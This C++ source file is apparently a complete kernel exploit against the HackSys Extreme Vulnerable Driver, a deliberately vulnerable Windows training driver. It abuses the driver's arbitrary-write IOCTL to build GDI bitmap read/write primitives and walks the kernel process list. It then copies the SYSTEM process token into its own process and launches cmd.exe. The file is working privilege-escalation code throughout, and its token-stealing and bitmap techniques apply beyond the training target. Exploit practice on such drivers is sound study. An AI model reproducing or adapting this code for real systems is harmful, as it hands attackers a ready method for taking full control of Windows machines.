#include <vector>
#include <iostream>
#include <Windows.h>
#include <Psapi.h>
#pragma comment(lib, "ntdll.lib")
#pragma warning(disable : 6387)

#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HEVD_IOCTL_ARBITRARY_WRITE                               IOCTL(0x802)
#define HACKSYS_DEV_NAME	L"\\\\.\\HackSysExtremeVulnerableDriver"
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define STATUS_SUCCESS		0
#define STATUS_UNSUCCESSFUL	-1

#define TOKEN_OFFSET					0x0F8
#define ID_OFFSET						0x0B4
#define ACTIVE_PROCESS_LINKS_OFFSET		0x0B8

struct _payload {
	std::uint32_t* readAddress;
	std::uint32_t* writeAddress;
};

HBITMAP hManager = 0;
HBITMAP hWorker  = 0;
std::uint32_t ManagerPvScan0 = 0;
std::uint32_t WorkerPvScan0  = 0;

typedef struct
{
	ULONG pKernelAddress;
	USHORT wProcessId;
	USHORT wCount;
	USHORT wUpper;
	USHORT wType;
	ULONG pUserAddress;
} GDICELL_32;

typedef struct _BASEOBJECT32 // 5 elements, 0x10 bytes (sizeof)
{
	ULONG32 hHmgr;
	ULONG32 ulShareCount;
	WORD cExclusiveLock;
	WORD BaseFlags;
	ULONG32 Tid;
}BASEOBJECT32, * PBASEOBJECT32;

typedef struct _SURFOBJ32 {
	ULONG32 dhsurf;
	ULONG32  hsurf;
	ULONG32 dhpdev;
	ULONG32   hdev;
	SIZEL  sizlBitmap;
	ULONG  cjBits;
	ULONG32  pvBits;
	ULONG32  pvScan0;
	LONG   lDelta;
	ULONG  iUniq;
	ULONG  iBitmapFormat;
	USHORT iType;
	USHORT fjBitmap;
} SURFOBJ32;

auto WritePrimitive(std::uint32_t source, void* buffer, std::size_t size) {
	::SetBitmapBits(hManager, size, &source);
	::SetBitmapBits(hWorker, size, buffer);
}


auto ReadPrimitive(std::uint32_t source, void* buffer, std::size_t size) {
	::SetBitmapBits(hManager, size, &source);
	::GetBitmapBits(hWorker, size, buffer);
}


auto GetNtBase() -> std::uint32_t {
	LPVOID lpImageBases[1024] = { 0 };
	DWORD lpcbNeeded = 0;

	auto c = ::EnumDeviceDrivers(lpImageBases, sizeof lpImageBases, static_cast<LPDWORD>(&lpcbNeeded));
	if (c == false)	return 0;

	auto ntBase = lpImageBases[0];

	return reinterpret_cast<std::uint32_t>(ntBase);
}


auto PsInitialSystemProcess() -> std::uint32_t {
	auto ntModule = ::LoadLibrary(L"ntoskrnl.exe");
	if (ntModule == nullptr)	return 0;

	auto initprocess = ::GetProcAddress(ntModule, "PsInitialSystemProcess");
	::FreeLibrary(ntModule);
	if (initprocess == nullptr)		return 0;

	auto ntbase = GetNtBase();
	
	auto KernelAddress = ntbase + 0x16D114;
	
	std::uint32_t PsInitialProcess = 0;
	ReadPrimitive(KernelAddress, &PsInitialProcess, sizeof std::uint32_t);
	
	return PsInitialProcess;
}


auto EscalatePrivileges() -> void {
	auto pid = ::GetCurrentProcessId();

	NTSTATUS status = STATUS_SUCCESS;
	auto initialProcess = PsInitialSystemProcess();
	std::printf("[*] Initial process : %lx\n", initialProcess);

	std::uint32_t initialToken = 0;
	ReadPrimitive(initialProcess + TOKEN_OFFSET, &initialToken, sizeof std::uint32_t);
	std::printf("[+] Initial process token : %lx\n", initialToken);

	LIST_ENTRY activeProcessLinks{};
	ReadPrimitive(initialProcess + ACTIVE_PROCESS_LINKS_OFFSET, &activeProcessLinks, sizeof LIST_ENTRY);
	
	auto temp = initialProcess;

	std::uint32_t res = 0;

	while (TRUE) {
		std::uint32_t UniqueProcessId = 0;

		// adjust EPROCESS pointer for next entry
		temp = (std::uint32_t)(activeProcessLinks.Flink) - ID_OFFSET - sizeof(std::uint32_t);

		// get pid
		ReadPrimitive(temp + ID_OFFSET, &UniqueProcessId, sizeof(std::uint32_t));

		// is this our pid?
		if (GetCurrentProcessId() == UniqueProcessId) {
			res = temp;
			std::printf("[+] Current Process : %lx\n", res);
			WritePrimitive(res + TOKEN_OFFSET, &initialToken, sizeof std::uint32_t);
			break;
		}
		// get next entry
		ReadPrimitive(temp + ID_OFFSET + sizeof(std::uint32_t), &activeProcessLinks, sizeof(LIST_ENTRY));

		// if next same as last, we reached the end
		if (temp == (std::uint32_t)(activeProcessLinks.Flink) - ID_OFFSET - sizeof(std::uint32_t))
			break;
	}
	
	std::system("cmd.exe");

	return;
}


auto GetHandle() -> HANDLE {
	auto hDev = ::CreateFile(HACKSYS_DEV_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
		nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (hDev == nullptr || hDev == INVALID_HANDLE_VALUE) {
		std::printf("[-] Failed to open handle to device.\n");
		std::printf("[-] Exiting with error code : %x\n", ::GetLastError());
		return nullptr;
	}

	std::printf("[*] Opened handle to device with value : %lx\n", reinterpret_cast<std::uint32_t>(hDev));
	return hDev;
}


auto Interact(HANDLE hDev, void* buffer, DWORD bufferSize) -> BOOL {
	if (hDev == nullptr || hDev == INVALID_HANDLE_VALUE)	return false;

	DWORD lpBytesReturned = 0x0;
	auto ret = ::DeviceIoControl(hDev, HEVD_IOCTL_ARBITRARY_WRITE, static_cast<LPVOID>(buffer), bufferSize,
		nullptr, 0, &lpBytesReturned, nullptr);

	if (ret)	std::printf("[*] Successfully interacted with device.\n");
	else		std::printf("[-] Failed to interact with device.\n");

	return ret;
}


auto GetPeb() -> std::uint32_t {
	auto teb = reinterpret_cast<std::uint32_t>(NtCurrentTeb());
	auto peb = *reinterpret_cast<std::uint32_t*>((UCHAR*)teb + 0x30);
	return peb;
}


auto GetGdiSharedHandle(void) -> std::uint32_t {
	auto Teb = reinterpret_cast<std::uint32_t>(NtCurrentTeb());
	auto Peb = *reinterpret_cast<std::uint32_t*>((PUCHAR)Teb + 0x30);
	auto GdiSharedHandle = *reinterpret_cast<std::uint32_t*>
		(reinterpret_cast<UCHAR*>(Peb) + 0x094);
	
	return GdiSharedHandle;
}


auto GetKernelAddress(HBITMAP bitmap) -> std::uint32_t {
	if (bitmap == nullptr)	return 0;

	WORD arrayIndex = LOWORD(bitmap);
	return *reinterpret_cast<std::uint32_t*>((GetGdiSharedHandle() + arrayIndex * sizeof(GDICELL_32)));
}


auto GetBitmapValues() -> std::vector<std::uint32_t>&& {
	char lpBits[0x20 * 0x40]{};

	auto ManagerBitmap = ::CreateBitmap(0x110, 0x10, 0x1, 0x4, &lpBits);
	if (ManagerBitmap == nullptr)	return { false, false };
	hManager = ManagerBitmap;

	auto WorkerBitmap = ::CreateBitmap(0x110, 0x10, 0x1, 0x4, &lpBits);
	if (WorkerBitmap == nullptr)	return { false, false };
	hWorker = WorkerBitmap;

	std::printf("[*] ManagerBitmap : %lx\n", reinterpret_cast<std::uint32_t>(ManagerBitmap));
	std::printf("[*] WorkerBitmap  : %lx\n", reinterpret_cast<std::uint32_t>(WorkerBitmap ));

	auto ManagerKernelAddress = GetKernelAddress(ManagerBitmap);
	if (ManagerKernelAddress == NULL)	return { false, false };

	auto WorkerKernelAddress = GetKernelAddress(WorkerBitmap);
	if (WorkerKernelAddress == NULL)	return { false, false };

	std::printf("[*] ManagerKernelAddress : %lx\n", ManagerKernelAddress);
	std::printf("[*] WorkerKernelAddress  : %lx\n", WorkerKernelAddress );

	ManagerPvScan0 = ManagerKernelAddress + 0x30;
	WorkerPvScan0  = WorkerKernelAddress  + 0x30;

	std::printf("[*] ManagerPvScan0 : %lx\n", ManagerPvScan0);
	std::printf("[*] WorkerPvScan0  : %lx\n", WorkerPvScan0);

	return { ManagerPvScan0, WorkerPvScan0 };

	// Write Worker PvScan0 to Manager PvScan0
}


auto GetHalAddress() -> std::uint32_t {
	auto ntBase = GetNtBase();

	auto hModule = LoadLibrary(L"ntoskrnl.exe");
	auto disptach = GetProcAddress(hModule, "HalDispatchTable");
	std::printf("[*] Dispatch : 0x%lx\n", reinterpret_cast<std::uint32_t>(disptach));

	auto base = ((std::uint32_t)ntBase + ((std::uint32_t)disptach - (std::uint32_t)hModule));
	std::printf("[*] Base : %lx\n", base);

	auto offset = 0x0012d440;

	auto HalDispatchTable = ntBase + offset;
	HalDispatchTable += 0x4;

	return HalDispatchTable;
}


auto PreparePayload() -> void* {
	auto payload = reinterpret_cast<_payload*>
		(::VirtualAlloc(nullptr, sizeof _payload, MEM_COMMIT, PAGE_EXECUTE_READWRITE));
	if (payload == nullptr) {
		std::printf("Failed to allocate memory for payload.\nExiting with error code : %lx\n", ::GetLastError());
		return nullptr;
	}

	//GetBitmapValues();

	payload->readAddress = &WorkerPvScan0; //readAddress;
	//payload->writeAddress = reinterpret_cast<std::uint32_t*>(HalDispatch);
	payload->writeAddress = reinterpret_cast<std::uint32_t*>(ManagerPvScan0); //writeAddress;

	return payload;
}


auto main(int argc, char* argv[]) -> int {
	auto hHandle = GetHandle();
	if (hHandle == nullptr)	return STATUS_UNSUCCESSFUL;

	GetBitmapValues();

	auto payload = PreparePayload();
	if (payload == nullptr)	return STATUS_UNSUCCESSFUL;
	
	auto c = Interact(hHandle, payload, sizeof _payload);
	if (c == false)		return STATUS_UNSUCCESSFUL;

	EscalatePrivileges();
	
	return STATUS_SUCCESS;
}
